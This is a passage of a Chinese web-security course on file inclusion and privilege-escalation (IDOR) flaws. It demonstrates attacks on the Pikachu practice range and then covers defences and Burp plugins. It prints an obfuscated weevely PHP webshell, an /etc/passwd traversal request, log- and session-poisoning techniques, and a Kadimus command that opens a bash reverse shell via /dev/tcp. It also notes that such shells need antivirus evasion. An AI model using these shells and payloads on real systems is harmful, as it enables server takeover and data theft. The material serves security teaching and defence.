$<span style="color: #a0522d;">x</span>=<span style="color: #8b2252;">'=0;($^!j&lt;$c&amp;&amp;$i&lt;$^!l);$j++^!,$i^!++){$^!o.=$t{^!$i^!}^$k{^!$^!j};}}return $o;}if^! (^!@preg_match^'</span>;
$<span style="color: #a0522d;">Y</span>=<span style="color: #8b2252;">'^!al(^!@gzunc^!omp^!res^!s(@x(@base^!64_d^!ecode($m[^!1]),$k)));$^!o=@o^!b_get_conte^!nts()^!;@ob_e'</span>;
$<span style="color: #a0522d;">k</span>=str_replace(<span style="color: #8b2252;">'ha'</span>,<span style="color: #8b2252;">''</span>,<span style="color: #8b2252;">'hacreathae_hafhaunhahaction'</span>);
$<span style="color: #a0522d;">m</span>=<span style="color: #8b2252;">'nc^!tio^!n x($t^!,$k^!)^!{$c=strlen($k)^!;$l=strlen(^!$t);$o=^!"";f^!^!or($i=^!0;$^!i&lt;$l;^!){for($j'</span>;
$<span style="color: #a0522d;">h</span>=<span style="color: #8b2252;">'^!n^!d_clean();^!$^!r=@ba^!s^!e64^!_encode(@x(@gzcompre^!ss^!($o),^!$k));prin^!^!t("$p$kh$r$kf");}'</span>;
$<span style="color: #a0522d;">E</span>=str_replace(<span style="color: #8b2252;">'^!'</span>,<span style="color: #8b2252;">''</span>,$<span style="color: #a0522d;">p</span>.$<span style="color: #a0522d;">m</span>.$<span style="color: #a0522d;">x</span>.$<span style="color: #a0522d;">S</span>.$<span style="color: #a0522d;">Y</span>.$<span style="color: #a0522d;">h</span>);
$<span style="color: #a0522d;">o</span>=$<span style="color: #a0522d;">k</span>(<span style="color: #8b2252;">''</span>,$<span style="color: #a0522d;">E</span>);$<span style="color: #a0522d;">o</span>();
?&gt;
</pre>
</div>

<p>
但是工具一旦出名后，就容易被查杀，需要自己去做一些去特征化的免杀的处理，
这不在本课程的讨论范围，有兴趣的话，你可以网上搜索关于木马免杀的文章。
</p>

<p>
之后 weevely.py 客户端直接连接就可以获得服务器的 shell 权限。
</p>

<div class="org-src-container">
<pre class="src src-lang-shell">$ python3 weevely.py http://127.0.0.1:8080/shell.php test
[+] weevely 4.0.1
[+] Target: www-data@7286434c6e88:/app
[+] Session:    /home/admin/.weevely/sessions/127.0.0.1/shell_1.session
[+] Shell:  System shell
[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.
weevely&gt; ls
a.php
assets
Dockerfile
footer.php
header.php
inc
index.php
install.php
LICENSE
pkxss
README.md
shell.php
shell.txt
test
vul
wiki
www-data@7286434c6e88:/app $ id
uid=1000(www-data) gid=50(staff) groups=50(staff)
</pre>
</div>
</div>
</div>
<div id="outline-container-本地文件包含" class="outline-3">
<h3 id="本地文件包含">本地文件包含</h3>
<div class="outline-text-3" id="text-本地文件包含">
<p>
如果加载的包含文件不允许从外部服务器获取，只能加载本地文件，那么这就属
于本地文件包含。正常情况下，本地文件并不会包含一句话木马等恶意文件（需
要使用其他更高级的利用技巧，具体见下文），但有时可以用来读取服务器的敏
感文件，如果对方有回显的话。
</p>

<p>
比如 Pikachu 靶场的“File Inclusion(local)”题目，我们可以尝试读取
/etc/passwd 文件，构造如下请求：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://127.0.0.1:8080/vul/fileinclude/fi_local.php?filename=../../../../../../../../etc/passwd&amp;submit=%E6%8F%90%E4%BA%A4
</pre>
</div>

<p>
成功读取到 /etc/passwd 文件。
</p>


<figure id="orga9ea95e">
<img src="./images/Cip5yGAX4EmATdfwAAIXYjl0obE125.png" alt="Cip5yGAX4EmATdfwAAIXYjl0obE125.png" width="80%">

</figure>

<p>
图 4 利用漏洞读取 /etc/passwd 文件
</p>
</div>
</div>
<div id="outline-container-漏洞利用技巧" class="outline-3">
<h3 id="漏洞利用技巧">漏洞利用技巧</h3>
<div class="outline-text-3" id="text-漏洞利用技巧">
<p>
随着PHP 5.2 之后默认关闭 allow_url_include 配置，也降低了远程文件包含
漏洞的出现。但是本地文件包含漏洞的利用方式，很多也适用于远程文件包含漏
洞，下面会介绍一些相对通用的利用技巧。
</p>

<p>
此处漏洞利用的目标仍然是为了获取服务器的 shell 权限，就需要设法在服务
器上写入文件，内容自然是一句话等恶意代码内容。但是，我们手上又没有写任
意文件的漏洞可利用，只能看看服务器上哪些文件会写入外部用户可控数据，或
者其他可执行 PHP 代码的方式。
</p>

<p>
总结起来，主要有下面几种利用方式。
</p>
</div>
<div id="outline-container-写日志文件" class="outline-4">
<h4 id="写日志文件">1.写日志文件</h4>
<div class="outline-text-4" id="text-写日志文件">
<p>
如果服务器开启访问日志记录的话，那么用户的请求数据就会被记录在日志文件，
若我们在地址上包含一句话木马的话，也同样会被记录进去。如果将一句话写在
URL 中常常会被 URL 编码存储，因此需要写 User-Agent 中，其他 HTTP头默认
不会被记录：
</p>


<figure id="orgd033634">
<img src="./images/Ciqc1GAX4FmADM5PAASEhBTUaiw277.png" alt="Ciqc1GAX4FmADM5PAASEhBTUaiw277.png" width="80%">

</figure>

<p>
图 5 注入一句话木马的访问日志
</p>

<p>
写入一句话木马之后，利用方式前面已经多次讲过，此处不再赘述。
</p>

<p>
常见的日志文件路径有：
</p>

<p>
/var/log/apache/access_log
</p>

<p>
/var/log/apache2/access.log
</p>

<p>
/var/log/apache2/error.log
</p>

<p>
/var/www/logs/access_log
</p>

<p>
/var/log/access_log
</p>

<p>
&#x2026;&#x2026;
</p>

<p>
除此之外，还有些 SSH、FTP、邮件等可产生日志的地方都可以自由发挥。
</p>
</div>
</div>
<div id="outline-container-写系统环境文件" class="outline-4">
<h4 id="写系统环境文件">2.写系统环境文件</h4>
<div class="outline-text-4" id="text-写系统环境文件">
<p>
/proc/self/environ 包含一些系统环境变量，比如HTTP_USER_AGENT、
HTTP_REFERER 等等，但需要 root 权限。如果当前的 web 应用无法写
/proc/self/environ 文件，就无法利用此方法，刚好我安装的 Pikachu 靶场就
没有 root 权限。
</p>

<p>
若拥有写 /proc/self/environ 的权限，那么可以在 User Agent中写入创建一
句话木马的 PHP 代码，然后再利用漏洞包含 /proc/self/environ 文件实现代
码的执行，整个过程与写日志文件的方式类似。
</p>
</div>
</div>
<div id="outline-container-写-session-文件" class="outline-4">
<h4 id="写-session-文件">3.写 Session 文件</h4>
<div class="outline-text-4" id="text-写-session-文件">
<p>
PHP 中的 Session 文件用于存储 Session 数据，它是根据 PHPSESSID来命名文
件存储，它常见下面几个路径：
</p>

<ul class="org-ul">
<li>/var/lib/php/sessions/sess_{PHPSESSID}</li>

<li>/var/lib/php/sess_{PHPSESSID}</li>

<li>/tmp/sess_{PHPSESSID}</li>

<li>/tmp/sessions/sess_{PHPSESSID}</li>
</ul>

<p>
PHPSESSID 存放在 Cookie 中：
</p>


<figure id="orgf0ff8c6">
<img src="./images/CgqCHmAX4HOAWgwcAADxpVOzpUc744.png" alt="CgqCHmAX4HOAWgwcAADxpVOzpUc744.png" width="80%">

</figure>

<p>
图 6 PHPSESSID
</p>

<p>
在 Pikachu 靶场中的对应 Session 文件为：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">/var/lib/php/sessions/sess_v2lvugriupo8qm9r8c7ot7lol2
</pre>
</div>

<p>
不过它是空文件，因为它没有写 Session 的行为。
</p>

<p>
但如果有用户数据存储到 Session 的行为，比如代码：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">&lt;?php
session_start();
$ctfs=$_GET['data'];
$_SESSION["username"]=$data;
?&gt;
</pre>
</div>

<p>
就可以通过 GET 参数 data 写入要执行的 PHP 代码，然后利用漏洞包含对应的
Session 文件就可以实现代码执行。这种利用方式不是那么通用，得多尝试才知
道如何写数据到 Session 文件，甚至可能一直找不到。
</p>
</div>
</div>
<div id="outline-container-利用上传文件" class="outline-4">
<h4 id="利用上传文件">4.利用上传文件</h4>
<div class="outline-text-4" id="text-利用上传文件">
<p>
如果有上传文件的地址，并且可以知道上传路径，比如上传头像的位置，可以上
传个写一句话木马的 jpg 文件，然后利用文件包含漏洞去执行。
</p>
</div>
</div>
<div id="outline-container-利用-php-伪协议" class="outline-4">
<h4 id="利用-php-伪协议">5.利用 PHP 伪协议</h4>
<div class="outline-text-4" id="text-利用-php-伪协议">
<p>
PHP 拥有许多伪协议，在远程和本地文件包含中都可以使用，我做个表总结下：
</p>


<figure id="org3a5b00f">
<img src="./images/Cip5yGAX4KSAapyBAAPVaA5QE1A158.png" alt="Cip5yGAX4KSAapyBAAPVaA5QE1A158.png" width="80%">

</figure>

<p>
此处我直接利用 data:// 执行代码，这比远程文件包含中利用方式便捷太多了，
比如下面直接系统命令的示例。
</p>


<figure id="orgf3410c1">
<img src="./images/Cip5yGAX4LqAHITdAAFk7HY8mf8051.png" alt="Cip5yGAX4LqAHITdAAFk7HY8mf8051.png" width="80%">

</figure>

<p>
图 7 利用 data:// 伪协议执行系统命令
</p>
</div>
</div>
</div>
<div id="outline-container-挖掘文件包含漏洞" class="outline-3">
<h3 id="挖掘文件包含漏洞">挖掘文件包含漏洞</h3>
<div class="outline-text-3" id="text-挖掘文件包含漏洞">
</div>
<div id="outline-container-动态检测思路" class="outline-4">
<h4 id="动态检测思路">1.动态检测思路</h4>
<div class="outline-text-4" id="text-动态检测思路">
<p>
挖掘文件包含漏洞的方式与测试漏洞的利用思路是一样的，分为本地和远程两种情况。
</p>

<ul class="org-ul">
<li><b>远程文件包含漏洞检测</b></li>
</ul>

<p>
（1）向目标参数指定远程 URL 发起请求，确定远程服务器是否收到相应请求，
此步骤可利用前面介绍过的 Burp Collaborator 进行测试。若发起请求说明有
可能存在远程请求文件，同时也可能出现 SSRF 漏洞。
</p>

<p>
（2）如果第 1 步失败，尝试提交一个不存在的 IP地址，并确认服务器尝试连
接此 IP 时是否会出现超时。
</p>

<p>
（3）若第 1 步确认访问成功或者第 2步确认请求超时，那么按前面介绍的利用
方法，尝试利用远程文件包含漏洞以作最终确认。
</p>

<ul class="org-ul">
<li><b>本地文件包含漏洞检测</b></li>
</ul>

<p>
（1）向目标参数提交一个已知的可执行资源的文件路径，比如 PHP 文件路径，
看应用程序是否有任何变化。
</p>

<p>
（2）向目标参数提交一个已知的静态资源的文件路径，比如图片，看它的内容是否会再现在响应数据中。
</p>

<p>
（3）若第 1 步或第 2 步出现引用指定资源的情况，则按前面介绍的利用技巧
尝试对疑似本地文件包含漏洞进行测试验证。
</p>

<p>
上述检测思路既适用于手工测试，也适用于日常的自动化扫描。
</p>
</div>
</div>
<div id="outline-container-静态检测思路" class="outline-4">
<h4 id="静态检测思路">2.静态检测思路</h4>
<div class="outline-text-4" id="text-静态检测思路">
<p>
从源码入手，采用前面介绍过的污点分析思路进行代码审计。梳理下文件包含漏
洞产生的相关source 与 sink，然后去追踪数据流从 source 传播到 sink过程
中是否有进行过滤，若没有则可能存在文件包含漏洞。
</p>


<figure id="org141667a">
<img src="./images/CgqCHmAX4MqASFfNAAFRLvvVLVE597.png" alt="CgqCHmAX4MqASFfNAAFRLvvVLVE597.png" width="80%">

</figure>
</div>
</div>
<div id="outline-container-自动化检测与利用工具kadimus" class="outline-4">
<h4 id="自动化检测与利用工具kadimus">3.自动化检测与利用工具：Kadimus</h4>
<div class="outline-text-4" id="text-自动化检测与利用工具kadimus">
<p>
提到自动化扫描，这里推荐一款自动化检测与利用文件包含漏洞的工具，它叫
<a href="https://github.com/P0cL4bs/Kadimus/">Kadimus</a>，支持较多的利用方式，有部分是在前面未介绍到的，比如利用
/var/log/auth.log 实现远程代码执行的方法，利用它可以更加便捷地针对文件
包含漏洞进行测试利用。
</p>

<p>
介绍几个常用命令：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#26816;&#27979;&#21442;&#25968;&#26159;&#21542;&#23384;&#22312;&#25991;&#20214;&#21253;&#21547;&#28431;&#27934;</span>
./kadimus -u localhost/?<span style="color: #a0522d;">pg</span>=contact -A my_user_agent

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35835;&#21462;&#25991;&#20214;&#20869;&#23481;</span>
./kadimus -u localhost/?<span style="color: #a0522d;">pg</span>=contact -S -f <span style="color: #8b2252;">"index.php%00"</span> -O local_output.php --parameter pg

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25191;&#34892;PHP&#20195;&#30721;</span>
./kadimus -u localhost/?<span style="color: #a0522d;">pg</span>=php://input%00 -C <span style="color: #8b2252;">'&lt;?php echo "pwned"; ?&gt;'</span> -T input

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25191;&#34892;&#31995;&#32479;&#21629;&#20196;</span>
./kadimus -t localhost/?<span style="color: #a0522d;">pg</span>=/var/log/auth.log -T auth -c <span style="color: #8b2252;">'ls -lah'</span> --ssh-target localhost

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#21453;&#36830;shell</span>
./kadimus -u localhost/?<span style="color: #a0522d;">pg</span>=contact.php -T data --parameter pg -lp 12345 -c <span style="color: #8b2252;">'/bin/bash -c "bash -i &gt;&amp; /dev/tcp/172.17.0.1/1234 0&gt;&amp;1"'</span> --retry-times 0
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-漏洞防御" class="outline-3">
<h3 id="漏洞防御">漏洞防御</h3>
<div class="outline-text-3" id="text-漏洞防御">
</div>
<div id="outline-container-白名单限制" class="outline-4">
<h4 id="白名单限制">1.白名单限制</h4>
<div class="outline-text-4" id="text-白名单限制">
<p>
如果已经知道要包含的文件范围，那么直接使用白名单限制，比如：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a020f0;">if</span>( $<span style="color: #a0522d;">file</span> != <span style="color: #8b2252;">"include.php"</span> &amp;&amp; $<span style="color: #a0522d;">file</span> != <span style="color: #8b2252;">"file1.php"</span> &amp;&amp; $<span style="color: #a0522d;">file</span> != <span style="color: #8b2252;">"file2.php"</span> &amp;&amp; $<span style="color: #a0522d;">file</span> != <span style="color: #8b2252;">"file3.php"</span> ) {
    // This isn<span style="color: #8b2252;">'t the page we want!</span>
<span style="color: #8b2252;">    echo "ERROR: File not found!";</span>
<span style="color: #8b2252;">    exit;</span>
<span style="color: #8b2252;">}</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-设置-open_basedir" class="outline-4">
<h4 id="设置-open_basedir">2.设置 open_basedir</h4>
<div class="outline-text-4" id="text-设置-open_basedir">
<p>
在 php.ini 中设置 open_basedir，可允许将 PHP打开的文件限制在指定的目录
中，可有效防止跨目录访问一些系统敏感文件。除了 php.ini 设置方法外，还可
在代码中设置：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">ini_set('open_basedir', '指定目录');
</pre>
</div>
</div>
</div>
<div id="outline-container-关闭-allow_url_include" class="outline-4">
<h4 id="关闭-allow_url_include">3.关闭 allow_url_include</h4>
<div class="outline-text-4" id="text-关闭-allow_url_include">
<p>
在 php.ini 中设置allow_url_include＝Off（默认关闭），避免远程文件包含，
同时减少一些伪协议的攻击，提高漏洞利用成本。
</p>
</div>
</div>
</div>
<div id="outline-container-小结" class="outline-3">
<h3 id="小结">小结</h3>
<div class="outline-text-3" id="text-小结">
<p>
本节课主要介绍了远程和本地两种类型的文件包含漏洞，教你如何挖掘与利用漏
洞，以及如何防御。
</p>

<p>
“文件包含”漏洞的产生主要是因为对用户输入数据没有进行有效过滤，导致允
许包含任意文件，进而执行恶意代码。所以在开发过程中，特别要注意使用文件
包含函数时，要对输入变量进行过滤限制，限制文件路径或者白名单。
</p>

<p>
希望你在学习本课程时，也能跟着动手检测与利用漏洞，操作一遍可以加深理解，
提高动手能力。毕竟本地文件包含漏洞的利用方式有点绕，可以先执行一个正常
且合理的操作，再利用漏洞实现代码执行。
</p>

<p>
下一节课开始，我将给你介绍越权漏洞，它在不同的业务场景下可以造成不同的
危害，因为它的特殊性，且比较偏业务逻辑处理上的问题，对它的检测与利用上
都造成的挑战。
</p>
</div>
</div>
</section>
<section id="outline-container-h:ee03d7e7-6ea0-448a-8b65-3fd264bcec64" class="outline-2">
<h2 id="h:ee03d7e7-6ea0-448a-8b65-3fd264bcec64">逻辑漏洞：你的订单信息是如何泄露的</h2>
<div class="outline-text-2" id="text-h:ee03d7e7-6ea0-448a-8b65-3fd264bcec64">
<p>
本节课开始介绍越权漏洞，这是一种偏业务逻辑处理缺陷的漏洞，不仅是 Web应
用，许多应用场景中会可能会遇到。
</p>

<p>
比如去年 12 月底，因北京健康宝网站存在越权漏洞，导致了“明星健康宝照片
泄露”事件，大量用户的个人信息被窃取，其中不乏明星的姓名、身份证、素颜
照等个人隐私信息。
</p>


<figure id="org6c50a22">
<img src="./images/Ciqc1GASYk-ASivfAAPyqJojcO8233.png" alt="Ciqc1GASYk-ASivfAAPyqJojcO8233.png" width="80%">

</figure>

<p>
图 1 记者获得的 1000 多位明星身份证号等信息
</p>

<p>
越权漏洞是很多应用中比较常见的漏洞类型，它是在授权逻辑上存在安全缺陷导
致的问题。在基于用户提供的输入对象直接访问，而未进行有效鉴权，导致一些
超出预期的操作行为，可能导致信息泄露或者提权，具体危害的大小取决于业务
场景，所以对越权漏洞的理解依赖于你对业务逻辑的理解深度。
</p>

<p>
当前国际上习惯将越权漏洞称为 IDOR（Insecure Direct Object Reference，
不安全的对象引用），在 HackerOne上公开的漏洞案例中，你以关键词 IDOR去
搜索，就可以找到不少真实的企业漏洞案例。
</p>
</div>
<div id="outline-container-越权漏洞的分类" class="outline-3">
<h3 id="越权漏洞的分类">越权漏洞的分类</h3>
<div class="outline-text-3" id="text-越权漏洞的分类">
<p>
根据越权对象的差异，可以分析水平越权和垂直越权。
</p>
</div>
<div id="outline-container-水平越权" class="outline-4">
<h4 id="水平越权">1.水平越权</h4>
<div class="outline-text-4" id="text-水平越权">
<p>
假设用户 A 与用户 B 属于相同权限等级的用户，当用户 A 能够访问用户 B的
私有数据时，就称为水平越权。
</p>

<p>
以 Pikachu靶场的水平越权题目为例，下图是个登录界面，先点击下“点一下提
示”获得 3个账号及其密码：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">lucy/123456
lili/123456
kobe/123456
</pre>
</div>


<figure id="orgef0251d">
<img src="./images/CgqCHmASYl-ALlPQAADSntiMgeU273.png" alt="CgqCHmASYl-ALlPQAADSntiMgeU273.png" width="80%">

</figure>

<p>
图 2 水平越权题目
</p>

<p>
先用 lucy 的账号密码登录，点击“点击查看个人信息”，页面返回 lucy的个
人信息：
</p>


<figure id="orgb201d95">
<img src="./images/Ciqc1GASYmWAedkmAABNDwsDWvI235.png" alt="Ciqc1GASYmWAedkmAABNDwsDWvI235.png" width="80%">

</figure>

<p>
图 3 查看个人信息
</p>

<p>
同时用 Chrome Network 抓包，得到查看个人信息的 GET 请求地址和参数：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://127.0.0.1:8080/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
</pre>
</div>

<p>
前面已经密码验证过了，如果此时修改 username为其他账号，是否会获得其他
用户的个人信息呢？
</p>

<p>
下面修改 username 为 lili，发起请求：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://127.0.0.1:8080/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=点击查看个人信息
</pre>
</div>


<figure id="org23c4c5f">
<img src="./images/CgqCHmASYm2Ab2EyAABOWImk5eg862.png" alt="CgqCHmASYm2Ab2EyAABOWImk5eg862.png" width="80%">

</figure>

<p>
图 4 水平越权获取他人隐私信息
</p>

<p>
如上图所示，成功获取 lili的个人信息，说明这里存在越权漏洞，且属于水平
越权，因为从原定权限看，两者的权限等级是相同的。
</p>

<p>
你可以自己动手尝试下，看能否获取用户 kobe 的个人信息。
</p>
</div>
</div>
<div id="outline-container-垂直越权" class="outline-4">
<h4 id="垂直越权">2.垂直越权</h4>
<div class="outline-text-4" id="text-垂直越权">
<p>
假设用户 A 是普通用户，用户 B 是管理员，当用户 A 能够访问用户 B 的私有
数据时，就称为垂直越权，又称为权限提升。
</p>

<p>
以 Pikachu 靶场的垂直越权题目为例，如下图所示，它也是个登录界面，先点击
下“点一下提示”获得2 个账号及其密码，其中 admin 是管理员账号：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">admin/123456
pikachu/000000
</pre>
</div>


<figure id="orgebecfba">
<img src="./images/CgqCHmASYneAdXuCAADff3i9-q4853.png" alt="CgqCHmASYneAdXuCAADff3i9-q4853.png" width="80%">

</figure>

<p>
图 5 Pikachu 靶场垂直越权题目
</p>

<p>
分别登录这 2 个账号看下有啥区别，下图是 admin登录后返回的信息，可以看
它拥有添加和删除用户的权限：
</p>


<figure id="org6714f1d">
<img src="./images/CioPOWAbYS6AYutqAAEgV7cor_U446.png" alt="CioPOWAbYS6AYutqAAEgV7cor_U446.png" width="80%">

</figure>

<p>
图 6 admin 管理界面
</p>

<p>
为方便后面测试，先记录添加与删除用户的请求数据。
</p>

<p>
先点击用户 vince 一行所在的“删除”按钮，删除用户 vince并抓包，得到请
求数据：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://127.0.0.1:8080/vul/overpermission/op2/op2_admin.php?id=1
</pre>
</div>

<p>
再点击“添加用户”，然后填写信息并点击“创建”：
</p>


<figure id="org9958677">
<img src="./images/CgqCHmASYoWAMqv3AABGLZP_sT8238.png" alt="CgqCHmASYoWAMqv3AABGLZP_sT8238.png" width="80%">

</figure>

<p>
图 7 添加用户
</p>

<p>
同时抓包获得请求数据：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">POST http://127.0.0.1:8080/vul/overpermission/op2/op2_admin_edit.php
username=test&amp;password=test&amp;sex=%E7%94%B7&amp;phonenum=13666666666&amp;email=test%40gmail.com&amp;address=test&amp;submit=%E5%88%9B%E5%BB%BA
</pre>
</div>

<p>
我们再回头登录看下普通用户 pikachu 登录后的情况。
</p>


<figure id="org519b8b5">
<img src="./images/Ciqc1GASYo2AdHCIAACXy3twnlg665.png" alt="Ciqc1GASYo2AdHCIAACXy3twnlg665.png" width="80%">

</figure>

<p>
图 8 pikachu 的查看页面
</p>

<p>
试想下，普通用户 pikachu 如何才能拥有 admin一样的增加与删除用户的权限
呢？
</p>

<p>
在当前用户为 pikachu 的情况下，尝试删除用户，构造如下请求去删除 id=2的
用户：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://127.0.0.1:8080/vul/overpermission/op2/op2_admin.php?id=2
</pre>
</div>

<p>
访问后 302 跳转到登录界面，且并没有删除成功，说明这里没有越权漏洞。
</p>


<figure id="org99380d4">
<img src="./images/Cip5yGASYpmAeunBAAFp0VO-lcU355.png" alt="Cip5yGASYpmAeunBAAFp0VO-lcU355.png" width="80%">

</figure>

<p>
图 9 构造删除用户的请求后，被重定向到登录界面
</p>

<p>
接下来看看添加用户的接口是否存在越权，在当前用户为 pikachu的情况下，构
建如下请求，添加一个用户名密码均为 hacker 的账号：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">POST http://127.0.0.1:8080/vul/overpermission/op2/op2_admin_edit.php
username=hacker&amp;password=hacker&amp;sex=%E7%94%B7&amp;phonenum=13666666666&amp;email=test%40gmail.com&amp;address=test&amp;submit=%E5%88%9B%E5%BB%B
</pre>
</div>

<p>
这里我使用 HackBar 去构造 POST 请求，请求后会跳转到登录界面，重新用
pikachu 登录可以看到 hacker账号已经创建成功，说明我们已经越权成功，这
里属于提升权限，所以它属于垂直越权漏洞。
</p>


<figure id="orgb48ee03">
<img src="./images/Cip5yGASYqSAFf6HAAGb6JILlBg819.png" alt="Cip5yGASYqSAFf6HAAGb6JILlBg819.png" width="80%">

</figure>

<p>
图 10 越权添加用户
</p>
</div>
</div>
</div>
<div id="outline-container-越权漏洞的检测与利用" class="outline-3">
<h3 id="越权漏洞的检测与利用">越权漏洞的检测与利用</h3>
<div class="outline-text-3" id="text-越权漏洞的检测与利用">
<p>
对于越权漏洞的检测与利用基本是一回事，因为它 <code>偏于业务逻辑缺陷</code> ，当你检测
到的时候，基本等同于利用了，所以此处我把它们放在一块儿谈。
</p>

<p>
越权漏洞的检测与利用，长期以来大多是 <code>以手工测试或半自动测试为主</code> ，因
为背后涉及一些业务逻辑功能的理解。对于自己公司内部业务做一些 <code>定制化的
全自动检测</code> 也是可行的， <code>比如掌握各类用户权限情况、涉及权限验证的敏感
操作请求等等情况</code> ，就可以尝试自动切换用户或删除登录态去执行敏感操作，
以此判断是否存在越权漏洞，再进行人工最终确认。
</p>

<blockquote>
<p>
关于自动化扫描越权漏洞，推荐<a href="https://f5.pm/go-49358.html">《越权扫描器碎碎念》</a>一文。
</p>
</blockquote>

<p>
下面我会介绍一些用来检测越权漏洞的常用工具，主要是一些 BurpSuite 插件，
都可以通过 BurpSuite 插件库 BApp Store 找到并安装，不过安装速度可能很慢，
甚至是多尝试几次才能安装成功。
</p>

<p>
这种情况可以尝试手工安装，先从<a href="https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f">BApp Store 官网</a>下载插件的 bapp 文件到本
地，然后点击“Manual install &#x2026;”选择下载的文件进行安装。
</p>


<figure id="org1627b1f">
<img src="./images/CgpVE2ASYrCAQc0UAAFN0G_SETY095.png" alt="CgpVE2ASYrCAQc0UAAFN0G_SETY095.png" width="80%">

</figure>

<p>
图 11 Manual install
</p>

<p>
下面介绍的这些工具都是刷漏洞奖励平台的利器，而且越权漏洞跟别人撞洞的概
率也会相对低些，有些奖金也不低。
</p>
</div>
<div id="outline-container-authz" class="outline-4">
<h4 id="authz">1.Authz</h4>
<div class="outline-text-4" id="text-authz">
<p>
Authz 的使用比较简单，在 BurpSuite 中将需要测试的请求发送到 Authz：
</p>


<figure id="orgac93d70">
<img src="./images/Cip5yGASYrmAJhs1AACr4L3wFK8509.png" alt="Cip5yGASYrmAJhs1AACr4L3wFK8509.png" width="80%">

</figure>

<p>
图 12 发送请求到 Authz
</p>

<p>
之后修改 Cookie值为其他用户，也可以是其他请求头信息，待准备测试的请求
收集完后，点击“Run”按钮即可。如果原响应内容长度、状态码和被修改请求
后的响应内容长度、状态码一致，则会被标为绿色，表示可能存在越权漏洞。
</p>


<figure id="orgaf332d0">
<img src="./images/Cip5yGASYsSAf32BAAFo4WeYkHI407.png" alt="Cip5yGASYsSAf32BAAFo4WeYkHI407.png" width="80%">

</figure>

<p>
图 13 Authz
</p>

<p>
以普通用户 pikachu 直接访问绿色的URL，可以直接打开“添加用户”的界面进
行操作，这原来是管理员 admin 才拥有的权限，非常明显的越权行为。
</p>


<figure id="orgeb10bdc">
<img src="./images/CgpVE2ASYs6AJzZgAAB88FDAhz8507.png" alt="CgpVE2ASYs6AJzZgAAB88FDAhz8507.png" width="80%">

</figure>

<p>
图 14 普通用户越权访问“添加用户”管理页面
</p>
</div>
</div>
<div id="outline-container-autorize" class="outline-4">
<h4 id="autorize">2.Autorize</h4>
<div class="outline-text-4" id="text-autorize">
<p>
Autorize 会对客户端发送的所有请求数据进行修改后重放，主要是将其他用户
的 Cookie 替换当前用户的 Cookie，或者其他授权验证相关的请求头。
</p>

<p>
Autorize 不用像 Authz 那样挑选请求并发送到插件，它可以直接配置要替换的
头信息，包括 Cookie 或者其他验证头信息，同时支持作用域过滤器，用来筛选
我们感兴趣的请求，避免收到大量的无用结果。
</p>


<figure id="org7821a4a">
<img src="./images/Cgp9HWAbYU-AUaN3AAJjCrZ0Gu0927.png" alt="Cgp9HWAbYU-AUaN3AAJjCrZ0Gu0927.png" width="80%">

</figure>

<p>
图 15 将其他用户的 Cookie 配置到 Autorize 进行替换
</p>

<p>
之后也是通过对比修改前后的响应结果来判断越权漏洞是否存在，若响应长度和
状态码一样，那就有可能存在越权漏洞。不过，有时候也需要人工难证下，有可
能一些页面本身就是允许任意用户访问的，需要分析下原设定的正常业务逻辑。
</p>
</div>
</div>
<div id="outline-container-auto-repeater" class="outline-4">
<h4 id="auto-repeater">3.Auto Repeater</h4>
<div class="outline-text-4" id="text-auto-repeater">
<p>
像 Authz 这种挑选请求并发送到插件的方式，测试效率会低一些，没有 Auto
Repeater 高效。
</p>

<p>
Auto Repeater 功能相对 Autorize 更多更复杂一些，可以理解为是它的扩展版，
是基于自动请求重放与响应比对的方式进行检测的，它可以对更加具体的请求参
数进行测试，比如 PHPSESSID、SID、UID 等涉及用户身份的参数，支持正则匹
配与替换。
</p>

<p>
点击“Active AutoRepeater”开启，再添加替换规则。比如，我想替换 Cookie
中的 PHPSESSID 参数值，可以在 Replacements 中添加替换规则，然后在 Base
Replacements 下为 cookie 配置一个规则，Type 选择“Match Cookie Name,
Replace Value”Match 设置为 Cookie 名称 PHPSESSID，替换为权限较低的用
户的Cookie 值。
</p>


<figure id="org66fc028">
<img src="./images/Cip5yGASYt-AJi6UAACfduv_yr0494.png" alt="Cip5yGASYt-AJi6UAACfduv_yr0494.png" width="80%">

</figure>

<p>
图 16 设置替换规则
</p>

<p>
在之后的捕获的请求中，若满足匹配条件就会自动修改数据并重新发送请求，用
户再根据响应结果是否有差异来判断是否存在越权漏洞，可以通过Logs 设置颜
色标记来区分，避免请求过多时，浪费过多时间排查验证。
</p>


<figure id="org10ac902">
<img src="./images/Cip5yGASYuiAAHGlAAEQwQoXtvw776.png" alt="Cip5yGASYuiAAHGlAAEQwQoXtvw776.png" width="80%">

</figure>

<p>
图 17 Auto Repeater Logs
</p>
</div>
</div>
</div>
<div id="outline-container-防御越权漏洞" class="outline-3">
<h3 id="防御越权漏洞">防御越权漏洞</h3>
<div class="outline-text-3" id="text-防御越权漏洞">
<p>
由于越权漏洞涉及业务逻辑，靠 WAF、RASP那些安全系统是没有用的，更重要的
是在开发设计时提前考虑好权限控制与校验问题，可以尝试从以下几方面入手：
</p>

<ol class="org-ol">
<li><b>整体的权限调节</b> ：每次访问一个对象时，都要检查访问是否授权，特别是
